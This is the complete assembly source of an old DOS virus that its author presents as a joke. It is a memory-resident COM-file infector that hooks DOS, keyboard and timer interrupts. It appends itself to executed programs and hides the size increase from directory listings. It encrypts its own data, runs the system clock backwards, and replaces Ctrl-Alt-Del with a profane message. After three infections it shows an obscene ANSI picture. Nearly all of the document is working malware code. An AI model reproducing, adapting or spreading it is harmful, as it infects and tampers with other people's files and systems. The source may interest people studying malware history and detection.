;*****************************************************************************
;*                              THE PENIS VIRUS 
;*
;*
;* By Soltan Griss  [YAM]
;*
;*
;*
;*
;* In no means was this intended to be a serious virus, I got bored one day
;* and decided to have some fun.
;*
;*
;* Well Here it is...
;*
;*****************************************************************************
seg_a           segment 
                assume  cs:seg_a,ds:seg_a,es:nothing
              
        org     100h
start:  db      0E9h,02,00,42h,0f2h

        mov     cx,(old_21-old_8)       ;RUN FIRST TIME ONLY
        mov     si,offset old_8         ;encrypt All text messages
        call    crypter            
        
        mov     cx,(exec-data) 
        mov     si,offset data
        call    crypter

       
vstart  equ     $                
        call    code_start 
code_start:          
        pop     si
        sub     si,offset code_start
        mov     bp,si
        jmp     load                    ;Load in the TSR
;**************************************************************************

old_8           dw      0,0

new_8:          push    ax                           
                push    bx                        ;lets run the clock   
                push    cx                        ;backwards   
                push    ds                           
                xor     ax,ax                        
                mov     ds,ax                         
                mov     bx,ds:46Ch                    
                mov     cx,ds:046Eh                   
                dec     bx                            
                jno     loc_4         
                dec     cx            
                jno     loc_4         
                mov     bx,0AFh       
                mov     cx,18h                    ;remember to do it twice
loc_4:                                            ;cause the normal increase
                dec     bx                        ;will negate the first one
                jno     loc_5         
                dec     cx            
                jno     loc_5         
                mov     bx,0AFh       
                mov     cx,18h        
loc_5:                                
                mov     ds:046Eh,cx   
                mov     ds:046Ch,bx   
                pop     ds            
                pop     cx            
                pop     bx            
                pop     ax                          
do_old_8:       jmp     dword ptr cs:[old_8-vstart] 
                                                    

;****************************************************************************
;int 9 handler

old_9   dd      ?                       ;Store old int 9

new_9:  
        
        push    ax
        in      al,60h                  ;Turn on Register 60
        cmp     al,53h                  ;Ctrl-Alt-Del
        
        je      fuck_you
        pop     ax
        jmp     dword ptr cs:[(old_9-vstart)]

say_it: db      "FUCK YOU ASSHOLE!  ","$"
        
fuck_you:        
        push    ds
        push    dx
        mov     ah,9h
        
        push    cs
        pop     ds
      
        mov     dx,say_it-vstart                ;Say message
        int     21h
        pop     dx
        pop     ds
        pop     ax
        iret



;***********************************************************************
;***********************************************************************
;***********************************************************************
;***********************************************************************
;***********************************************************************

old_21  dd      ?

new_21: 
        cmp     ax,4b00h                        ;Are we executing?
        je      exec1
        
        cmp     ah,11h
        je      hide_size
        cmp     ah,12h
        je      hide_size
        cmp     ax,0f242h                       ;Are we going resident?
        jne     do_old                          
        mov     bx,242fh                        ;Set our residency byte
do_old: jmp     dword ptr cs:[(old_21-vstart)]  ;If not then do old int 21
exec1:  jmp     exec
do_dir: jmp     dword ptr cs:[(old_21-vstart)]  
        ret        

hide_size:
        pushf
        push    cs
        call    do_dir                          ;get the current FCB
        cmp     al,00h
        jnz     dir_error                       ;jump if bad FCB
        
        push    ax
        push    bx
        push    es                              ;undocumented get FCB 
        mov     ah,51h                          ;location
        int     21h
        mov     es,bx                           ;get info from FCB
        cmp     bx,es:[16h]
        jnz     not_inf
        mov     bx,dx
        mov     al,[bx]
        push    ax
        mov     ah,2fh                          ;get DTA 
        int     21h
        pop     ax
        inc     al                              ;Check for extended FCB
        jnz     normal_fcb
        add     bx,7h
normal_fcb:
        mov     ax,es:[bx+17h]
        and     ax,1fh
        xor     al,01h                          ;check for 2 seconds
        jnz     not_inf
        
        and     byte ptr es:[bx+17h],0e0h       ;subtract virus size
        sub     es:[bx+1dh],(vend-vstart)
        sbb     es:[bx+1fh],ax
not_inf:pop     es
        pop     bx
        pop     ax
        
dir_error:   
        iret                                    ;back to caller


;***************************************************************************
;***************************************************************************
;* PICTURE TO DISPLAY
;***************************************************************************

data    DB      'Ü',4,'Ü',4,'Ü',4,'Ü',4,' ',4,' ',15,'Ü',4,' ',15,' '
        DB      15,' ',15,' ',15,'Ü',4,'Ü',4,'Ü',4,'Ü',4,' ',15,'Ü',4
        DB      'Ü',4,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,'Ü',4
        DB      'Ü',4,' ',15,' ',15,'Ü',4,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,'Ü',4,' ',15,'Ü',4,'Ü',4,'Ü',4,'Ü',4,'Û',64,'Û'
        DB      64,' ',15,' ',0,' ',0,' ',0,' ',15,' ',0,' ',15,' ',15
        DB      ' ',15,' ',15,' ',0,' ',0,' ',0,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',0,' '
        DB      0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' '
        DB      0,' ',0,' ',0,' ',0,' ',0,' ',64,' ',15,' ',15,' ',15
        DB      ' ',64,'Û',64,' ',64,' ',15,' ',15,' ',15,' ',15,' ',64
        DB      ' ',15,' ',15,' ',64,' ',15,' ',15,' ',64,'Ü',4,' ',15
        DB      ' ',15,' ',15,' ',15,'Ü',4,' ',64,' ',4,' ',15,' ',15
        DB      'Û',4,'Û',4,'Ü',4,' ',15,'Û',64,' ',64,'Û',4,' ',15,'Û'
        DB      4,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',0,' '
        DB      0,' ',0,' ',15,' ',0,' ',15,' ',15,' ',15,' ',15,' ',0
        DB      ' ',0,' ',0,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',0,' ',0,' ',0,' ',0,' '
        DB      0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' '
        DB      0,' ',0,' ',64,'Ü',64,'Ü',64,'Ü',64,'ß',64,'Û',64,' '
        DB      64,' ',15,' ',15,' ',15,' ',15,' ',64,' ',15,' ',15,' '
        DB      64,' ',15,' ',15,' ',15,' ',64,'Ü',4,' ',64,' ',64,'ß'
        DB      64,' ',64,' ',4,' ',15,' ',15,' ',15,'Û',4,' ',15,'Û'
        DB      4,'Ü',4,'Û',4,' ',15,'Û',4,' ',15,'Û',4,'Ü',64,'Ü',64
        DB      'Û',64,' ',15,' ',15,' ',15,' ',0,' ',0,' ',0,' ',15,' '
        DB      0,' ',15,' ',15,' ',15,' ',15,' ',0,' ',0,' ',0,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0
        DB      ' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',64,'Ü',4
        DB      'Ü',4,'Ü',4,'Ü',64,' ',15,' ',64,'Ü',4,'Ü',4,'Ü',4,' '
        DB      15,' ',64,'Ü',4,'Ü',4,' ',64,' ',15,' ',15,' ',15,' '
        DB      15,' ',64,' ',15,' ',15,' ',64,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,'Û',4,' ',15,' ',15,'ß',4,' ',15,' ',15,'Û'
        DB      4,' ',15,'Û',4,'Ü',4,'Ü',4,'Ü',4,'Û',64,'Û',64,' ',15
        DB      ' ',0,' ',0,' ',0,' ',15,' ',0,' ',15,' ',15,' ',15,' '
        DB      15,' ',0,' ',0,' ',0,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',0,' ',0,' ',0,' '
        DB      0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' '
        DB      0,' ',0,' ',0,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,'Û',96,'ß',96
        DB      'ß',96,'ß',96,'Û',96,'Û',96,'Û',96,'Û',96,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',0,' ',15,' ',15,' ',15,' ',15,' ',0,' ',0,' ',0,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',96,' ',96,' ',96,' ',96,' ',103,' ',103
        DB      ' ',103,' ',103,' ',103,' ',103,' ',103,' ',103,' ',103
        DB      ' ',103,' ',103,' ',103,' ',103,' ',103,' ',103,' ',103
        DB      ' ',103,' ',103,' ',103,' ',103,' ',103,' ',103,' ',103
        DB      ' ',103,' ',103,'±',96,'°',96,'°',96,' ',96,'ß',96,'Û'
        DB      96,'Û',96,'Û',96,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,'Ü'
        DB      15,'Ü',15,'Ü',15,' ',15,' ',15,' ',0,' ',0,' ',0,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',96,' ',96,' ',96
        DB      ' ',103,' ',103,' ',103,' ',103,' ',103,' ',103,' ',103
        DB      ' ',96,' ',103,' ',103,' ',103,' ',103,' ',103,' ',103
        DB      ' ',103,' ',103,' ',103,' ',103,' ',103,' ',103,' ',103
        DB      ' ',103,' ',103,' ',103,' ',103,' ',103,' ',103,'±',96
        DB      '±',96,'°',96,'°',96,' ',96,'Û',96,'Û',96,'Ü',15,'Ü',15
        DB      'Ü',15,'Û',15,'Û',15,'Û',15,' ',15,' ',15,' ',15,' ',15
        DB      'Û',15,'Û',15,'Û',15,'Û',15,'Û',15,'Û',15,'Û',15,' ',15
        DB      ' ',0,' ',0,' ',0,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',96,' ',96,' ',96,' ',96,' ',103,' ',103,'Ä',96
        DB      'Ä',96,'Ä',96,'Ä',96,'Ä',96,'Ä',96,'Ä',96,'Ä',96,'Ä',96
        DB      'Ä',96,'Ä',96,'Ä',96,'Ä',96,'Ä',96,'Ä',96,'Ä',96,'Ä',96
        DB      'Ä',96,'Ä',96,'Ä',96,'Ä',96,'Ä',96,'Ä',96,'Ä',96,'Ä',96
        DB      '±',96,'±',96,'°',96,'°',96,' ',96,'Û',96,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,'ß',15,'ß',15,'ß',15,' ',15,' ',15
        DB      ' ',0,' ',0,' ',0,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',0,' ',0,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',96,' ',103,' ',103,' ',96,' ',96,' ',103,'ß',96
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,'Ü',96,'Ü',96,'Ü',96,'Û',96,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',0,' ',0,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',103,' ',103,' ',103,'°',96,'°',96,'°',96,' '
        DB      103,'ß',96,' ',15,' ',15,' ',15,' ',15,' ',0,' ',0,' '
        DB      0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',0,' ',0,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',103,' ',103,'°',96,'°',96,'°',96,'°',96,' ',103
        DB      'Ü',96,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',0,' ',0,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',103,'°',96,'°',96,'°',96,'°',96,' ',103,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',0,' ',0,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,'Ü',96,' ',103,' ',103,' ',103,'Ü',96,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',0,' ',0,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' '
        DB      0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' '
        DB      0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' '
        DB      0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' '
        DB      0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' '
        DB      0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' '
        DB      0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',0,' ',0,' ',0,' ',0,' ',0
        DB      ' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0
        DB      ' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0
        DB      ' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0
        DB      ' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0
        DB      ' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0
        DB      ' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',0,' ',0,' ',0,' '
        DB      0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' '
        DB      0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' '
        DB      0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' '
        DB      0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' '
        DB      0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' '
        DB      0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' ',0,' '
        DB      0,' ',0,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      0,' ',0,' ',0,' ',0,' ',0,' ',0,' '
doggie  DB      15,'Y',15,'O',15,'U',15,'R',15,' ',15,'F',15,'I',15,'L',15,'E'
        DB      15,' ',15,'H',15,'A',15,'S',15,' ',15,'J',15,'U',15,'S',15,'T'
        DB      15,' ',15,'B',15,'E',15,' ',15,'P',15,'E',15,'N',15,'I',15,'S'
        DB      15,'`',15,'I',15,'Z',15,'E',15,'D',15,' ',15,'C',15,'O',15,'M'
        DB      15,'P',15,'L',15,'E',15,'M',15,'E',15,'N',15,'T',15,'S',15,' '
        DB      15,'O',15,'F',15,' ',15,' ',15,' '
        DB      0,' ',0,' ',15,' ',15,' ',15,' '
        DB      03,'[',03,'Y',03,'A',03,'M'
        DB      03,']',03,'/',03,'9',03,'2'
        DB      03,' ',02,'-',04,'S',04,'.',04,'G',04,'R',04,'I',04,'S',04,'S'
        DB      04,' ',0,' ',0,' ',0,' ',0,' ',0
        DB      ' ',0,' ',0,' ',0,' ',0,' ',0
;Actual program begins here
         
exec:   
        push    ax  
        push    bx
        push    cx
        push    dx
        push    di
        push    si
        push    ds  
        push    es
        
        
        mov     ax,4300h                        ;get file attributes
        int     21h
        jc      long_cock

        and     cl,0feh                         ;make it read/write
        mov     ax,4301h
        int     21h
        jc      long_cock
        


infect: 
        mov     ax,3d02h
        int     21h
        jc      long_cock
        
        
        mov     bx,ax
                
        push    ds
        push    cs
        pop     ds

        mov     ah,3fh
        mov     cx,5h
        mov     dx,(buffer-vstart)              ;load in the first 5 bytes
        int     21h
        jc      long_cock
        

        cmp     word ptr cs:[(buffer-vstart)],5A4Dh ;check to see if its an
        je      long_cock                           ;EXE 
        
        cmp     word ptr cs:[(buffer-vstart)+3],42F2h
        je      long_cock                           ;Check to see if F242 tag
                                                    ;if so then its infected
        jmp     next

long_cock:        
        jmp     cocker2

next:   

        mov     ax,5700h
        int     21h

        mov     word ptr cs:[(old_time-vstart)],cx  ;get the files time 
        mov     word ptr cs:[(old_date-vstart)],dx  ;and date
 
        mov     ax,4202h                            ;move file pointer to end
        xor     cx,cx                               ;top get the files size
        xor     dx,dx
        int     21h
        jc      long_cock
        mov     cx,ax
        sub     cx,3                                ;sub 3 form jump at begining
        mov     word ptr cs:[(jump_add+1-vstart)],cx;save length in jmp commmand

        
        mov     cx,(old_21-old_8) ;number of bytes to encrypt before writing
        mov     si,(old_8-vstart)
        call    crypter

        mov     cx,(exec-data) 
        mov     si,(data-vstart)
        call    crypter



        mov     ah,byte ptr cs:[(infect_times-vstart)]
        mov     byte ptr cs:[(infect_times-vstart)],00h
        push    ax

        mov     cx,(vend-vstart)                    ;write the virus to the end
        mov     ah,40h                              ;of the file
        xor     dx,dx
        int     21h
        jc      cocker
        
        pop     ax
        inc     ah
        mov     byte ptr cs:[(infect_times-vstart)],ah ;counter 


        mov     cx,(exec-data) 
        mov     si,(data-vstart)                    ;decrypt data
        call    crypter

        mov     cx,(old_21-old_8) ;number of bytes to decrypt after writing
        mov     si,(old_8-vstart)
        call    crypter
        
        
        mov     ax,4200h                            ;move file pointer to the 
        xor     cx,cx                               ;begining to write the JMP
        xor     dx,dx
        int     21h


        mov     cx,5
        mov     ah,40h                              ;write the JMP top the file
        mov     dx,(jump_add-vstart)
        int     21h
        
        jc      cocker

        mov     ax,5701h
        mov     word ptr cx,cs:[(old_time-vstart)]  ;Restore old time,date
        mov     word ptr dx,cs:[(old_date-vstart)]
        
        and     cl,0e0H
        inc     cl                                  ;change seconds to 2
        int     21h                     
        

        mov     ah,3eh
        int     21h


        jmp     show_dick
cocker: jmp     cocker2
         
      
show_dick:
        
        cmp     byte ptr cs:[(infect_times-vstart)],03h
        jl      cocker
        
        
        
        mov     ah,0fh                             ;get current video mode
        int     010h
        cmp     al,7                               ;is it a monochrome mode?
        jz      mono                               ;yes
        mov     ax,0B800h                          ;color text video segment
        jmp     SHORT doit
mono:   mov     ax, 0B000h                         ;monochrome text video segment
doit:   mov     es,ax
        
        push    cs
        pop     ds
        mov     si,data-vstart                     ;load destination offset
        xor     di,di                              ;clear destination index counter
        mov     cx,(exec-data+1)/2
        rep     movsw                              ;write to video memory
              
        mov     ah,02h                             ;hide cursor
        mov     bh,0                               ;assume video page 0
        mov     dx,1A00h                           ;moves cursor past bottom of screen
        int     010h
                

lup:    mov     ah, 01h    
        int     016h       
        jz      lup        
        mov     ah,0       
        int     016h

       ;Clear the screen
         mov    ah, 6                          ;function 6 (scroll window up)
         mov    al, 0                          ;blank entire screen
         mov    bh, 7                          ;attribute to use
         mov    ch, 0                          ;starting row
         mov    cl, 0                          ;starting column
         mov    dh, 25                         ;ending row
         mov    dl, 80                         ;ending column
         int    10h                            ;call interrupt 10h

         mov    ah,02h                         ;puts cursor back where it belongs
         mov    bh,0                           ;assume video page 0
         mov    dx,0
         int    010h

        
        
cocker2:pop     ds
        pop     es
        pop     ds
        pop     si                           ;go back to old int 21
        pop     di
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        
        jmp    dword ptr cs:[(old_21-vstart)] 
        
old_date dw     0
old_time dw     0


buffer: db      0cdh,20h,00
buffer2 db      0,0        
infect_times:   DB   0h
jump_add: db    0E9h,00,00,0F2h,42h;

;***********************************************************************
;***********************************************************************
;***********************************************************************
;***********************************************************************
;***********************************************************************
        
exit2:  jmp     exit
crypter: 
        push   ax                             ;Encryptor Routine
loo:    mov    ah,byte ptr cs:[si]            ;move byte into ah
        xor    ah,0AAh                        ;Xor it
        mov    byte ptr cs:[si],ah            ;write it back
        inc    si
        loop   loo
        pop     ax
        ret

        
load:   mov     ax,0f242h                       ; Check to see if we are
        int     21h                             ; allready resident
        cmp     bx,0242fh                       ; looking for f242 tag
        je      exit2
        

        mov     cx,(old_21-old_9)               ;number of bytes to decrypt
        mov     si,offset old_9
        add     si,bp
        call    crypter
        
        mov     cx,(exec-data)                  ;number of bytes to decrypt
        mov     si,offset data
        add     si,bp
        call    crypter


dec_here:
        push    cs
        pop     ds

        mov     ah,49h                          ;Release current Memory block
        int     21h

        mov     ah,48h                          ;Request Hugh size of memory
        mov     bx,0ffffh                       ;returns biggest size
        int     21h
        

        mov     ah,4ah
        sub     bx,(vend-vstart+15)/16+1        ;subtract virus size
        jc      exit2
        int     21h

        
        mov     ah,48h
        mov     bx,(vend-vstart+15)/16          ;request last XXX pages
        int     21h                             ;allocate it to virus
        jc      exit2        
        
        dec     ax
        
        push    es
        
        mov     es,ax
        
        mov     byte ptr es:[0],'Z'             ;make DOS the  owner
        mov     word ptr es:[1],8
        mov     word ptr es:[3],(vend-vstart+15)/16    ;put size here
        sub     word ptr es:[12h],(vend-vstart+15)/16  ;sub size from current         
                                                       ;memory
        inc     ax

        
        lea     si,[bp+offset vstart]       ;copy it to new memory block
        xor     di,di
        mov     es,ax
        mov     cx,(vend-vstart+5)/2
        cld
        rep     movsw

        
        
        xor     ax,ax        
        mov     ds,ax
        push    ds
        lds     ax,ds:[21h*4]                        ;swap vectors manually
        mov     word ptr es:[old_21-vstart],ax
        mov     word ptr es:[old_21-vstart+2],ds
        pop     ds
        mov     word ptr ds:[21h*4],(new_21-vstart)
        mov     ds:[21h*4+2],es

        

        xor     ax,ax        
        mov     ds,ax
        push    ds
        lds     ax,ds:[9h*4]
        mov     word ptr es:[old_9-vstart],ax
        mov     word ptr es:[old_9-vstart+2],ds
        pop     ds
        mov     word ptr ds:[9h*4],(new_9-vstart)
        mov     ds:[9h*4+2],es

        

        xor     ax,ax        
        mov     ds,ax
        push    ds
        lds     ax,ds:[8h*4]
        mov     word ptr es:[old_8-vstart],ax
        mov     word ptr es:[old_8-vstart+2],ds
        pop     ds
        mov     word ptr ds:[8h*4],(new_8-vstart)
        mov     ds:[8h*4+2],es


        push    cs
        pop     ds


exit:   
        push    cs
        pop     es

        
       ; now got to copy it back...... 
       

        mov     cx,5
        mov     si,offset buffer                ;copy it back and run original
        add     si,bp                           ;program
        mov     di,100h
        repne   movsb

        mov     bp,100h
        jmp     bp


vend    equ     $

seg_a        ends
        end     start




        
        
        


